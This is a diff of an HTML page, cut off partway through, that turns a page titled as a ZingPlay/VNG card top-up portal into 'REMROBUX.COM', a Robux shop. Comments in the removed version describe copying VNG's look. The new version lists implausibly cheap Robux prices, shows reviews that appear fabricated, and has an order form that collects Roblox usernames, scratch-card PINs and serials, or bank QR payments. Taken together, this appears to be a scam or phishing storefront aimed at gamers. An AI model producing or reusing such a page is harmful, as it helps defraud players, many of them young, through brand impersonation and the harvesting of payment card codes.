@@ -3,302 +3,575 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Cổng Nạp Thẻ - ZingPlay / VNG</title>
+    <title>REMROBUX.COM - Shop Robux Uy Tín</title>
     <style>
         * {
             box-sizing: border-box;
             margin: 0;
             padding: 0;
-            font-family: Arial, sans-serif;
+            font-family: 'Segoe UI', Roboto, sans-serif;
         }
 
         body {
-            background-color: #eef1f6;
-            color: #333;
-            padding-bottom: 40px;
+            background-color: #0b0214;
+            background-image: 
+                radial-gradient(circle at 10% 10%, rgba(236, 72, 153, 0.12) 0%, transparent 40%),
+                radial-gradient(circle at 90% 90%, rgba(168, 85, 247, 0.12) 0%, transparent 40%);
+            color: #ffffff;
+            padding-bottom: 50px;
         }
 
-        /* HEADER CHUẨN VNG / ZING */
+        /* HEADER / NAVBAR */
         header {
-            background: #ffffff;
-            border-bottom: 2px solid #ff6600;
-            padding: 10px 0;
-            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
+            background: rgba(18, 5, 33, 0.9);
+            backdrop-filter: blur(10px);
+            border-bottom: 1px solid rgba(236, 72, 153, 0.25);
+            position: sticky;
+            top: 0;
+            z-index: 100;
         }
 
         .nav-container {
-            max-width: 960px;
+            max-width: 1240px;
             margin: 0 auto;
             display: flex;
             justify-content: space-between;
             align-items: center;
-            padding: 0 15px;
+            padding: 12px 20px;
         }
 
-        .logo-area {
+        .logo-box {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            text-decoration: none;
+        }
+
+        .logo-img {
+            width: 45px;
+            height: 45px;
+            border-radius: 50%;
+            object-fit: cover;
+            border: 2px solid #ec4899;
+            box-shadow: 0 0 10px #ec4899;
+        }
+
+        .logo-texts {
+            display: flex;
+            flex-direction: column;
+        }
+
+        .logo-title {
+            font-size: 1.25rem;
+            font-weight: 900;
+            color: #ffffff;
+            letter-spacing: 0.5px;
+        }
+
+        .logo-sub {
+            font-size: 0.65rem;
+            color: #f472b6;
+            font-weight: bold;
+            letter-spacing: 1px;
+        }
+
+        .nav-menu {
+            display: flex;
+            gap: 22px;
+            list-style: none;
+            align-items: center;
+        }
+
+        .nav-menu a {
+            color: #d1d5db;
+            text-decoration: none;
+            font-size: 0.85rem;
+            font-weight: 700;
+            transition: 0.3s;
+        }
+
+        .nav-menu a:hover, .nav-menu a.active {
+            color: #f472b6;
+            text-shadow: 0 0 8px rgba(244, 114, 182, 0.6);
+        }
+
+        .btn-login-nav {
+            background: linear-gradient(90deg, #ec4899, #d946ef);
+            color: white;
+            border: none;
+            padding: 8px 18px;
+            border-radius: 20px;
+            font-weight: bold;
+            font-size: 0.85rem;
+            cursor: pointer;
+            box-shadow: 0 0 12px rgba(236, 72, 153, 0.4);
+            transition: 0.3s;
+        }
+
+        .btn-login-nav:hover {
+            opacity: 0.9;
+            box-shadow: 0 0 20px rgba(236, 72, 153, 0.8);
+        }
+
+        /* HERO BANNER */
+        .hero {
+            max-width: 1240px;
+            margin: 25px auto;
+            padding: 0 20px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            background: linear-gradient(135deg, rgba(30, 10, 56, 0.85), rgba(13, 3, 26, 0.95));
+            border: 1px solid rgba(236, 72, 153, 0.3);
+            border-radius: 20px;
+            position: relative;
+            overflow: hidden;
+            box-shadow: 0 0 35px rgba(236, 72, 153, 0.15);
+        }
+
+        .hero-content {
+            padding: 40px 20px 40px 30px;
+            z-index: 2;
+            max-width: 650px;
+        }
+
+        .hero-tag {
+            background: rgba(236, 72, 153, 0.15);
+            border: 1px solid #ec4899;
+            color: #f472b6;
+            padding: 6px 14px;
+            border-radius: 20px;
+            font-size: 0.8rem;
+            font-weight: bold;
+            display: inline-block;
+            margin-bottom: 15px;
+            box-shadow: 0 0 10px rgba(236, 72, 153, 0.2);
+        }
+
+        .hero h1 {
+            font-size: 3rem;
+            font-weight: 900;
+            color: #ffffff;
+            line-height: 1.1;
+            margin-bottom: 10px;
+            text-shadow: 0 0 20px rgba(236, 72, 153, 0.6);
+            letter-spacing: 1px;
+        }
+
+        .hero-subtitle {
+            color: #c084fc;
+            font-weight: 800;
+            font-size: 0.95rem;
+            letter-spacing: 2px;
+            margin-bottom: 25px;
+        }
+
+        .hero-features {
+            display: flex;
+            gap: 12px;
+            margin-bottom: 30px;
+        }
+
+        .feat-card {
+            background: rgba(255, 255, 255, 0.04);
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            padding: 12px 14px;
+            border-radius: 12px;
+            flex: 1;
+        }
+
+        .feat-card strong {
+            display: block;
+            font-size: 0.85rem;
+            color: #f472b6;
+            margin-bottom: 2px;
+        }
+
+        .feat-card span {
+            font-size: 0.7rem;
+            color: #9ca3af;
+        }
+
+        .hero-btns {
+            display: flex;
+            gap: 15px;
+        }
+
+        .btn-pink-hero {
+            background: linear-gradient(90deg, #ec4899, #d946ef);
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            border-radius: 12px;
+            font-weight: bold;
+            font-size: 0.95rem;
+            cursor: pointer;
+            box-shadow: 0 0 15px rgba(236, 72, 153, 0.5);
+            transition: 0.3s;
+        }
+
+        .btn-pink-hero:hover { transform: translateY(-2px); box-shadow: 0 0 25px rgba(236, 72, 153, 0.8); }
+
+        .btn-outline-hero {
+            background: rgba(255, 255, 255, 0.04);
+            border: 1px solid rgba(236, 72, 153, 0.4);
+            color: white;
+            padding: 12px 24px;
+            border-radius: 12px;
+            font-weight: bold;
+            font-size: 0.95rem;
+            cursor: pointer;
+            transition: 0.3s;
+        }
+
+        .btn-outline-hero:hover { background: rgba(236, 72, 153, 0.15); }
+
+        .hero-img-box {
+            position: relative;
+            padding: 20px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .hero-img-box img {
+            max-width: 420px;
+            height: auto;
+            filter: drop-shadow(0 0 25px rgba(236, 72, 153, 0.5));
+            animation: floatHero 4s ease-in-out infinite;
+        }
+
+        @keyframes floatHero {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-10px); }
+        }
+
+        /* MAIN LAYOUT CONTAINER */
+        .container {
+            max-width: 1240px;
+            margin: 0 auto;
+            padding: 0 20px;
+        }
+
+        .section-header {
             display: flex;
             align-items: center;
             gap: 12px;
+            margin: 35px 0 20px 0;
+            font-size: 1.3rem;
+            font-weight: 800;
+            color: #ffffff;
         }
 
-        .logo-area img {
-            height: 42px;
-            object-fit: contain;
+        .section-header span {
+            color: #ec4899;
         }
 
-        .brand-title {
-            font-size: 1.1rem;
-            font-weight: bold;
-            color: #ff6600;
-            text-transform: uppercase;
-        }
-
-        .support-hotline {
-            font-size: 0.85rem;
-            color: #666;
-            font-weight: bold;
-        }
-
-        /* CONTAINER CHÍNH */
-        .main-wrapper {
-            max-width: 960px;
-            margin: 25px auto;
-            padding: 0 15px;
+        .grid-layout {
             display: grid;
-            grid-template-columns: 2.2fr 1fr;
-            gap: 20px;
+            grid-template-columns: 2.7fr 1.3fr;
+            gap: 25px;
         }
 
-        @media (max-width: 768px) {
-            .main-wrapper {
-                grid-template-columns: 1fr;
-            }
+        /* BẢNG GIÁ ROBUX TRONG HÌNH MẪU */
+        .price-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 15px;
         }
 
-        .card-box {
-            background: #ffffff;
-            border-radius: 6px;
-            border: 1px solid #dce0e6;
-            padding: 20px;
-            margin-bottom: 20px;
-            box-shadow: 0 1px 2px rgba(0,0,0,0.02);
+        .price-card {
+            background: rgba(22, 9, 39, 0.75);
+            border: 1px solid rgba(236, 72, 153, 0.25);
+            border-radius: 16px;
+            padding: 20px 15px;
+            text-align: center;
+            position: relative;
+            transition: 0.3s;
+            overflow: hidden;
         }
 
-        .box-title {
-            font-size: 1rem;
+        .price-card:hover {
+            transform: translateY(-5px);
+            border-color: #ec4899;
+            box-shadow: 0 0 20px rgba(236, 72, 153, 0.35);
+            background: rgba(33, 13, 58, 0.85);
+        }
+
+        .card-tag {
+            position: absolute;
+            top: 10px;
+            right: 10px;
+            background: #ec4899;
+            color: white;
+            font-size: 0.6rem;
             font-weight: bold;
-            color: #ff6600;
+            padding: 2px 7px;
+            border-radius: 8px;
+        }
+
+        .card-icon {
+            font-size: 1.8rem;
+            margin-bottom: 8px;
+        }
+
+        .price-card h3 {
+            font-size: 1.25rem;
+            font-weight: 900;
+            color: #ffffff;
+            margin-bottom: 5px;
+        }
+
+        .price-card .money {
+            font-size: 1rem;
+            font-weight: 800;
+            color: #f472b6;
             margin-bottom: 15px;
-            padding-bottom: 8px;
-            border-bottom: 1px solid #eee;
+        }
+
+        .btn-buy-card {
+            background: linear-gradient(90deg, #ec4899, #c084fc);
+            color: white;
+            border: none;
+            padding: 9px;
+            border-radius: 8px;
+            font-weight: bold;
+            font-size: 0.85rem;
+            width: 100%;
+            cursor: pointer;
+            transition: 0.2s;
+        }
+
+        .btn-buy-card:hover { opacity: 0.9; box-shadow: 0 0 10px rgba(236, 72, 153, 0.6); }
+
+        /* SIDEBAR TẠI SAO CHỌN CHÚNG TÔI */
+        .sidebar-box {
+            background: rgba(22, 9, 39, 0.75);
+            border: 1px solid rgba(236, 72, 153, 0.25);
+            border-radius: 16px;
+            padding: 22px;
+        }
+
+        .why-list {
+            list-style: none;
+            display: flex;
+            flex-direction: column;
+            gap: 18px;
+        }
+
+        .why-item {
+            display: flex;
+            gap: 12px;
+            align-items: flex-start;
+        }
+
+        .why-icon {
+            background: rgba(236, 72, 153, 0.15);
+            border: 1px solid rgba(236, 72, 153, 0.3);
+            color: #f472b6;
+            width: 36px;
+            height: 36px;
+            border-radius: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 1rem;
+            flex-shrink: 0;
+        }
+
+        .why-text h4 {
+            font-size: 0.9rem;
+            color: #ffffff;
+            margin-bottom: 2px;
+        }
+
+        .why-text p {
+            font-size: 0.75rem;
+            color: #9ca3af;
+        }
+
+        /* ĐÁNH GIÁ KHÁCH HÀNG & KẾT NỐI (2 CỘT DƯỚI) */
+        .bottom-grid {
+            display: grid;
+            grid-template-columns: 2.7fr 1.3fr;
+            gap: 25px;
+            margin-top: 20px;
+        }
+
+        .reviews-box {
+            background: rgba(22, 9, 39, 0.75);
+            border: 1px solid rgba(236, 72, 153, 0.25);
+            border-radius: 16px;
+            padding: 20px;
+        }
+
+        .reviews-container {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 12px;
+            margin-top: 15px;
+        }
+
+        .review-card {
+            background: rgba(255, 255, 255, 0.03);
+            border: 1px solid rgba(255, 255, 255, 0.06);
+            padding: 12px;
+            border-radius: 12px;
+        }
+
+        .reviewer-info {
             display: flex;
             align-items: center;
             gap: 8px;
-        }
-
-        /* KHUNG THÔNG TIN TÀI KHOẢN */
-        .acc-info-box {
-            background: #fff8f5;
-            border: 1px solid #ffdcd0;
-            padding: 15px;
-            border-radius: 4px;
-            margin-bottom: 15px;
-        }
-
-        .acc-info-box p {
-            font-size: 0.9rem;
-            color: #444;
-            line-height: 1.5;
-        }
-
-        .form-row {
-            margin-bottom: 15px;
-        }
-
-        .form-row label {
-            display: block;
-            font-size: 0.9rem;
-            font-weight: bold;
             margin-bottom: 6px;
-            color: #333;
         }
 
-        .form-row input, .form-row select {
-            width: 100%;
-            padding: 10px 12px;
-            border: 1px solid #ccc;
-            border-radius: 4px;
-            font-size: 0.95rem;
-            outline: none;
-            background: #fff;
+        .reviewer-avatar {
+            width: 28px;
+            height: 28px;
+            border-radius: 50%;
+            object-fit: cover;
         }
 
-        .form-row input:focus, .form-row select:focus {
-            border-color: #ff6600;
-            box-shadow: 0 0 3px rgba(255,102,0,0.2);
-        }
-
-        /* LƯỚI GÓI NẠP (GIỐNG VNG) */
-        .package-grid {
-            display: grid;
-            grid-template-columns: repeat(3, 1fr);
-            gap: 10px;
-            margin-bottom: 15px;
-        }
-
-        @media (max-width: 480px) {
-            .package-grid {
-                grid-template-columns: repeat(2, 1fr);
-            }
-        }
-
-        .package-item {
-            border: 1px solid #ccc;
-            border-radius: 4px;
-            padding: 12px 8px;
-            text-align: center;
-            cursor: pointer;
-            background: #fff;
-            transition: 0.2s;
-        }
-
-        .package-item:hover {
-            border-color: #ff6600;
-        }
-
-        .package-item.active {
-            border-color: #ff6600;
-            background: #fff5f0;
-            position: relative;
-        }
-
-        .package-item.active::after {
-            content: '✔';
-            position: absolute;
-            top: 2px;
-            right: 5px;
-            color: #ff6600;
-            font-size: 0.75rem;
+        .reviewer-name {
+            font-size: 0.8rem;
             font-weight: bold;
+            color: #fff;
         }
 
-        .pkg-name {
-            font-size: 0.95rem;
-            font-weight: bold;
-            color: #333;
-            margin-bottom: 4px;
+        .stars {
+            color: #f59e0b;
+            font-size: 0.65rem;
+            margin-bottom: 6px;
         }
 
-        .pkg-price {
-            font-size: 0.85rem;
-            color: #d9534f;
-            font-weight: bold;
+        .review-text {
+            font-size: 0.7rem;
+            color: #9ca3af;
+            line-height: 1.4;
         }
 
-        /* PHƯƠNG THỨC THANH TOÁN CHUẨN TAB VNG */
-        .pay-tabs {
+        .social-box {
+            background: rgba(22, 9, 39, 0.75);
+            border: 1px solid rgba(236, 72, 153, 0.25);
+            border-radius: 16px;
+            padding: 20px;
+        }
+
+        .social-buttons {
             display: flex;
             gap: 10px;
-            margin-bottom: 15px;
+            margin-top: 15px;
         }
 
-        .pay-tab-btn {
+        .btn-social {
             flex: 1;
-            padding: 10px;
-            border: 1px solid #ccc;
-            background: #f7f7f7;
-            border-radius: 4px;
-            font-weight: bold;
-            font-size: 0.9rem;
-            cursor: pointer;
-            text-align: center;
-            color: #555;
-        }
-
-        .pay-tab-btn.active {
-            background: #ff6600;
-            color: white;
-            border-color: #ff6600;
-        }
-
-        .payment-content-pane {
-            display: none;
-            background: #fafafa;
-            border: 1px solid #eee;
-            padding: 15px;
-            border-radius: 4px;
-            margin-bottom: 15px;
-        }
-
-        .payment-content-pane.active {
-            display: block;
-        }
-
-        /* CỘT PHẢI: THÔNG TIN TÀI KHOẢN GAME NHẬN */
-        .sidebar-info {
-            background: #fff;
-            border: 1px solid #dce0e6;
-            border-radius: 6px;
-            padding: 15px;
-        }
-
-        .sidebar-info h3 {
-            font-size: 0.95rem;
-            color: #333;
-            margin-bottom: 10px;
-            font-weight: bold;
-        }
-
-        .sidebar-info ul {
-            padding-left: 18px;
-            font-size: 0.85rem;
-            color: #666;
-            line-height: 1.6;
-        }
-
-        /* NÚT XÁC NHẬN CHUẨN VNG */
-        .btn-submit-vng {
-            background: #ff6600;
-            color: white;
+            padding: 10px 8px;
+            border-radius: 10px;
             border: none;
-            width: 100%;
-            padding: 12px;
-            border-radius: 4px;
-            font-size: 1rem;
             font-weight: bold;
+            font-size: 0.75rem;
             cursor: pointer;
-            text-transform: uppercase;
-            transition: 0.2s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+            color: white;
+            text-decoration: none;
         }
 
-        .btn-submit-vng:hover {
-            background: #e55c00;
+        .btn-fb { background: #1877f2; }
+        .btn-dc { background: #5865f2; }
+        .btn-zl { background: #0068ff; }
+
+        /* FORM ĐẶT HÀNG THANH TOÁN (TÍCH HỢP QR VĨNH VIỄN) */
+        .order-section {
+            background: rgba(22, 9, 39, 0.85);
+            border-radius: 16px;
+            padding: 30px;
+            border: 1px solid rgba(236, 72, 153, 0.35);
+            margin-top: 30px;
+            box-shadow: 0 0 30px rgba(0, 0, 0, 0.6);
         }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 700;
+            color: #e5e7eb;
+            font-size: 0.95rem;
+        }
+
+        .form-group input, .form-group select {
+            width: 100%;
+            padding: 14px;
+            border-radius: 10px;
+            border: 1px solid rgba(236, 72, 153, 0.25);
+            background: #110420;
+            color: white;
+            font-size: 1rem;
+            outline: none;
+            transition: 0.3s;
+        }
+
+        .form-group input:focus, .form-group select:focus {
+            border-color: #ec4899;
+            box-shadow: 0 0 12px rgba(236, 72, 153, 0.4);
+        }
+
+        .btn-submit {
+            width: 100%;
+            padding: 16px;
+            background: linear-gradient(90deg, #ec4899, #a855f7);
+            color: #fff;
+            border: none;
+            border-radius: 12px;
+            font-weight: bold;
+            font-size: 1.1rem;
+            cursor: pointer;
+            box-shadow: 0 0 20px rgba(236, 72, 153, 0.5);
+            transition: 0.3s;
+            text-transform: uppercase;
+        }
+
+        .btn-submit:hover { opacity: 0.95; box-shadow: 0 0 30px rgba(236, 72, 153, 0.8); }
 
         /* TOAST THÔNG BÁO */
         #toast {
             visibility: hidden;
-            min-width: 250px;
-            background-color: #333;
+            min-width: 280px;
+            background-color: #1b0c30;
             color: #fff;
             text-align: center;
-            border-radius: 4px;
-            padding: 12px;
+            border-radius: 10px;
+            padding: 16px 24px;
             position: fixed;
             z-index: 1000;
             left: 50%;
             bottom: 30px;
             transform: translateX(-50%);
-            font-size: 0.9rem;
+            border: 1px solid #ec4899;
+            box-shadow: 0 0 20px rgba(236, 72, 153, 0.4);
             font-weight: bold;
-            box-shadow: 0 2px 6px rgba(0,0,0,0.2);
-            transition: opacity 0.3s, bottom 0.3s;
+            opacity: 0;
+            transition: opacity 0.4s, bottom 0.4s, visibility 0.4s;
         }
 
         #toast.show {
             visibility: visible;
             opacity: 1;
-            bottom: 40px;
+            bottom: 50px;
+        }
+
+        @media (max-width: 900px) {
+            .hero { flex-direction: column; text-align: center; }
+            .hero-img-box { display: none; }
+            .grid-layout, .bottom-grid, .price-grid, .reviews-container { grid-template-columns: 1fr; }
+            .nav-menu { display: none; }
         }
     </style>
 </head>
@@ -307,126 +580,254 @@
     <!-- HEADER -->
     <header>
         <div class="nav-container">
-            <div class="logo-area">
-                <img src="https://i.ibb.co/68Hn6Wp/image-4.png" alt="Logo" onerror="this.src='https://i.ibb.co/3sS4Ssb/rem-anime.png'">
-                <div class="brand-title">Cổng Thanh Toán & Nạp Robux</div>
-            </div>
-            <div class="support-hotline">Hỗ trợ khách hàng: 1900 XXXX</div>
+            <a href="#" class="logo-box">
+                <img src="https://i.ibb.co/68Hn6Wp/image-4.png" alt="Logo" class="logo-img" onerror="this.src='https://i.ibb.co/3sS4Ssb/rem-anime.png'">
+                <div class="logo-texts">
+                    <span class="logo-title">REMROBUX.COM</span>
+                    <span class="logo-sub">♦ SHOP ROBUX UY TÍN ♦</span>
+                </div>
+            </a>
+            <ul class="nav-menu">
+                <li><a href="#" class="active">TRANG CHỦ</a></li>
+                <li><a href="#orderForm">NẠP ROBUX</a></li>
+                <li><a href="#orderForm">MUA ROBUX</a></li>
+                <li><a href="#">ACC ROBLOX</a></li>
+                <li><a href="#">VÒNG QUAY</a></li>
+                <li><a href="#">TIN TỨC</a></li>
+            </ul>
+            <button class="btn-login-nav">ĐĂNG NHẬP</button>
         </div>
     </header>
 
-    <!-- MAIN BODY -->
-    <div class="main-wrapper">
-        <!-- CỘT TRÁI: FORM NẠP CHÍNH -->
-        <div>
-            <form id="vngExactForm">
-                <!-- 1. TÀI KHOẢN -->
-                <div class="card-box">
-                    <div class="box-title">1. Thông tin tài khoản nhận Robux</div>
-                    <div class="form-row">
-                        <label>Tên tài khoản Roblox (Username):</label>
-                        <input type="text" id="username" placeholder="Nhập chính xác tên tài khoản Roblox..." required>
+    <!-- HERO BANNER GIỐNG ẢNH -->
+    <div class="hero">
+        <div class="hero-content">
+            <div class="hero-tag">SHOP ROBUX UY TÍN - GIÁ RẺ - TỰ ĐỘNG 24/7</div>
+            <h1>REMROBUX.COM</h1>
+            <div class="hero-subtitle">ROBUX CHÍNH HÃNG - AN TOÀN - UY TÍN</div>
+            <div class="hero-features">
+                <div class="feat-card">
+                    <strong>UY TÍN</strong>
+                    <span>Đảm bảo 100% chính hãng</span>
+                </div>
+                <div class="feat-card">
+                    <strong>TỰ ĐỘNG</strong>
+                    <span>Giao dịch tự động 24/7</span>
+                </div>
+                <div class="feat-card">
+                    <strong>GIÁ RẺ</strong>
+                    <span>Giá tốt nhất thị trường</span>
+                </div>
+            </div>
+            <div class="hero-btns">
+                <button class="btn-pink-hero" onclick="document.getElementById('orderForm').scrollIntoView({ behavior: 'smooth' })">🛒 MUA ROBUX NGAY</button>
+                <button class="btn-outline-hero" onclick="document.getElementById('orderForm').scrollIntoView({ behavior: 'smooth' })">💳 NẠP ROBUX</button>
+            </div>
+        </div>
+        <div class="hero-img-box">
+            <img src="https://i.ibb.co/68Hn6Wp/image-4.png" alt="Rem Anime" onerror="this.src='https://i.ibb.co/3sS4Ssb/rem-anime.png'">
+        </div>
+    </div>
+
+    <div class="container">
+        
+        <!-- LƯỚI BẢNG GIÁ & TẠI SAO CHỌN CHÚNG TÔI -->
+        <div class="grid-layout">
+            <div>
+                <h2 class="section-header"><span>✦</span> BẢNG GIÁ ROBUX <span>✦</span></h2>
+                <div class="price-grid">
+                    <div class="price-card">
+                        <div class="card-icon">💎</div>
+                        <h3>400 Robux</h3>
+                        <div class="money">20.000 VNĐ</div>
+                        <button class="btn-buy-card" onclick="selectPackage('400 Robux - 20.000 VNĐ')">MUA NGAY</button>
                     </div>
-                    <div class="acc-info-box">
-                        <p>💡 <b>Lưu ý quan trọng:</b> Vui lòng kiểm tra kỹ tên tài khoản game trước khi thực hiện nạp thẻ để tránh gửi nhầm người chơi khác.</p>
+                    <div class="price-card">
+                        <div class="card-icon">💎</div>
+                        <h3>800 Robux</h3>
+                        <div class="money">60.000 VNĐ</div>
+                        <button class="btn-buy-card" onclick="selectPackage('800 Robux - 60.000 VNĐ')">MUA NGAY</button>
+                    </div>
+                    <div class="price-card">
+                        <span class="card-tag">HOT</span>
+                        <div class="card-icon">💎</div>
+                        <h3>1.700 Robux</h3>
+                        <div class="money">100.000 VNĐ</div>
+                        <button class="btn-buy-card" onclick="selectPackage('1.700 Robux - 100.000 VNĐ')">MUA NGAY</button>
+                    </div>
+                    <div class="price-card">
+                        <span class="card-tag" style="background:#8b5cf6;">BEST</span>
+                        <div class="card-icon">💎</div>
+                        <h3>4.500 Robux</h3>
+                        <div class="money">200.000 VNĐ</div>
+                        <button class="btn-buy-card" onclick="selectPackage('4.500 Robux - 200.000 VNĐ')">MUA NGAY</button>
+                    </div>
+                    <div class="price-card">
+                        <div class="card-icon">💎</div>
+                        <h3>10.000 Robux</h3>
+                        <div class="money">350.000 VNĐ</div>
+                        <button class="btn-buy-card" onclick="selectPackage('10.000 Robux - 350.000 VNĐ')">MUA NGAY</button>
+                    </div>
+                    <div class="price-card">
+                        <span class="card-tag" style="background:#e11d48;">VIP</span>
+                        <div class="card-icon">💎</div>
+                        <h3>22.500 Robux</h3>
+                        <div class="money">500.000 VNĐ</div>
+                        <button class="btn-buy-card" onclick="selectPackage('22.500 Robux - 500.000 VNĐ')">MUA NGAY</button>
+                    </div>
+                </div>
+            </div>
+
+            <div>
+                <h2 class="section-header"><span>✦</span> TẠI SAO CHỌN CHÚNG TÔI? <span>✦</span></h2>
+                <div class="sidebar-box">
+                    <ul class="why-list">
+                        <li class="why-item">
+                            <div class="why-icon">🛡️</div>
+                            <div class="why-text">
+                                <h4>ROBUX CHÍNH HÃNG</h4>
+                                <p>Cam kết Robux chính hãng 100%</p>
+                            </div>
+                        </li>
+                        <li class="why-item">
+                            <div class="why-icon">⚡</div>
+                            <div class="why-text">
+                                <h4>GIAO DỊCH TỰ ĐỘNG</h4>
+                                <p>Nhận Robux ngay lập tức 24/7</p>
+                            </div>
+                        </li>
+                        <li class="why-item">
+                            <div class="why-icon">🔒</div>
+                            <div class="why-text">
+                                <h4>BẢO MẬT TUYỆT ĐỐI</h4>
+                                <p>Thông tin khách hàng được bảo mật</p>
+                            </div>
+                        </li>
+                        <li class="why-item">
+                            <div class="why-icon">🎧</div>
+                            <div class="why-text">
+                                <h4>HỖ TRỢ NHIỆT TÌNH</h4>
+                                <p>Hỗ trợ khách hàng 24/7</p>
+                            </div>
+                        </li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+
+        <!-- PHẦN ĐÁNH GIÁ VÀ KẾT NỐI -->
+        <div class="bottom-grid">
+            <div class="reviews-box">
+                <h2 style="font-size: 1.05rem; font-weight: bold; display: flex; align-items: center; gap: 8px;">⭐ ĐÁNH GIÁ TỪ KHÁCH HÀNG</h2>
+                <div class="reviews-container">
+                    <div class="review-card">
+                        <div class="reviewer-info">
+                            <img src="https://i.ibb.co/3sS4Ssb/rem-anime.png" class="reviewer-avatar" alt="Avatar">
+                            <span class="reviewer-name">Minh Khang</span>
+                        </div>
+                        <div class="stars">★★★★★</div>
+                        <div class="review-text">Shop uy tín, nạp robux cực nhanh, không bị lỗi. 10 điểm!</div>
+                    </div>
+                    <div class="review-card">
+                        <div class="reviewer-info">
+                            <img src="https://i.ibb.co/3sS4Ssb/rem-anime.png" class="reviewer-avatar" alt="Avatar">
+                            <span class="reviewer-name">Hoàng Nam</span>
+                        </div>
+                        <div class="stars">★★★★★</div>
+                        <div class="review-text">Giá rẻ hơn nhiều shop khác, rất đáng tin cậy!</div>
+                    </div>
+                    <div class="review-card">
+                        <div class="reviewer-info">
+                            <img src="https://i.ibb.co/3sS4Ssb/rem-anime.png" class="reviewer-avatar" alt="Avatar">
+                            <span class="reviewer-name">Bảo Ngọc</span>
+                        </div>
+                        <div class="stars">★★★★★</div>
+                        <div class="review-text">Nạp tự động siêu nhanh, sẽ ủng hộ lâu dài!</div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="social-box">
+                <h2 style="font-size: 1.05rem; font-weight: bold; margin-bottom: 12px;">🔗 KẾT NỐI VỚI CHÚNG TÔI</h2>
+                <div class="social-buttons">
+                    <a href="#" class="btn-social btn-fb">Facebook</a>
+                    <a href="#" class="btn-social btn-dc">Discord</a>
+                    <a href="#" class="btn-social btn-zl">Zalo</a>
+                </div>
+            </div>
+        </div>
+
+        <!-- FORM ĐẶT HÀNG & THANH TOÁN (CÓ QR VIETCOMBANK CỦA BẠN) -->
+        <div class="order-section" id="orderForm">
+            <h2 class="section-header" style="margin-top:0;"><span>✦</span> THÔNG TIN ĐẶT HÀNG <span>✦</span></h2>
+            <form id="robuxForm">
+                <div class="form-group">
+                    <label for="username">Tên Tài Khoản Roblox (Username):</label>
+                    <input type="text" id="username" placeholder="Nhập chính xác tên tài khoản Roblox của bạn" required>
+                </div>
+
+                <div class="form-group">
+                    <label for="packageSelect">Gói Robux Đã Chọn:</label>
+                    <select id="packageSelect" required>
+                        <option value="">-- Chọn gói Robux --</option>
+                        <option value="400 Robux - 20.000 VNĐ">400 Robux - 20.000 VNĐ</option>
+                        <option value="800 Robux - 60.000 VNĐ">800 Robux - 60.000 VNĐ</option>
+                        <option value="1.700 Robux - 100.000 VNĐ">1.700 Robux - 100.000 VNĐ</option>
+                        <option value="4.500 Robux - 200.000 VNĐ">4.500 Robux - 200.000 VNĐ</option>
+                        <option value="10.000 Robux - 350.000 VNĐ">10.000 Robux - 350.000 VNĐ</option>
+                        <option value="22.500 Robux - 500.000 VNĐ">22.500 Robux - 500.000 VNĐ</option>
+                    </select>
+                </div>
+
+                <div class="form-group">
+                    <label for="paymentMethod">Phương thức thanh toán:</label>
+                    <select id="paymentMethod" onchange="togglePaymentFields()">
+                        <option value="card">Thẻ cào điện thoại</option>
+                        <option value="qr" selected>Chuyển khoản / Quét mã QR (Khuyên dùng)</option>
+                    </select>
+                </div>
+
+                <!-- KHU VỰC THẺ CÀO -->
+                <div id="cardFields" style="display: none; background: rgba(17, 4, 32, 0.8); padding: 20px; border-radius: 12px; margin-bottom: 20px; border: 1px solid rgba(236, 72, 153, 0.2);">
+                    <div class="form-group">
+                        <label for="cardType">Loại thẻ:</label>
+                        <select id="cardType">
+                            <option value="Viettel">Viettel</option>
+                            <option value="Vinaphone">Vinaphone</option>
+                            <option value="Mobifone">Mobifone</option>
+                            <option value="Zing">Zing</option>
+                        </select>
+                    </div>
+                    <div class="form-group">
+                        <label for="cardPin">Mã thẻ (PIN):</label>
+                        <input type="text" id="cardPin" placeholder="Nhập mã thẻ cào...">
+                    </div>
+                    <div class="form-group">
+                        <label for="cardSeri">Mã Seri thẻ:</label>
+                        <input type="text" id="cardSeri" placeholder="Nhập số seri...">
                     </div>
                 </div>
 
-                <!-- 2. CHỌN GÓI -->
-                <div class="card-box">
-                    <div class="box-title">2. Chọn gói mệnh giá</div>
-                    <div class="package-grid">
-                        <div class="package-item" onclick="selectPkg(this, '300 Robux - 20.000 VNĐ')">
-                            <div class="pkg-name">300 Robux</div>
-                            <div class="pkg-price">20.000 đ</div>
-                        </div>
-                        <div class="package-item" onclick="selectPkg(this, '700 Robux - 50.000 VNĐ')">
-                            <div class="pkg-name">700 Robux</div>
-                            <div class="pkg-price">50.000 đ</div>
-                        </div>
-                        <div class="package-item" onclick="selectPkg(this, '1.400 Robux - 100.000 VNĐ')">
-                            <div class="pkg-name">1.400 Robux</div>
-                            <div class="pkg-price">100.000 đ</div>
-                        </div>
-                        <div class="package-item" onclick="selectPkg(this, '2.800 Robux - 200.000 VNĐ')">
-                            <div class="pkg-name">2.800 Robux</div>
-                            <div class="pkg-price">200.000 đ</div>
-                        </div>
-                        <div class="package-item" onclick="selectPkg(this, '5.600 Robux - 500.000 VNĐ')">
-                            <div class="pkg-name">5.600 Robux</div>
-                            <div class="pkg-price">500.000 đ</div>
-                        </div>
-                        <div class="package-item" onclick="selectPkg(this, '11.200 Robux - 1.000.000 VNĐ')">
-                            <div class="pkg-name">11.200 Robux</div>
-                            <div class="pkg-price">1.000.000 đ</div>
-                        </div>
-                    </div>
-                    <input type="hidden" id="selectedPackage" required>
-                </div>
-
-                <!-- 3. PHƯƠNG THỨC THANH TOÁN -->
-                <div class="card-box">
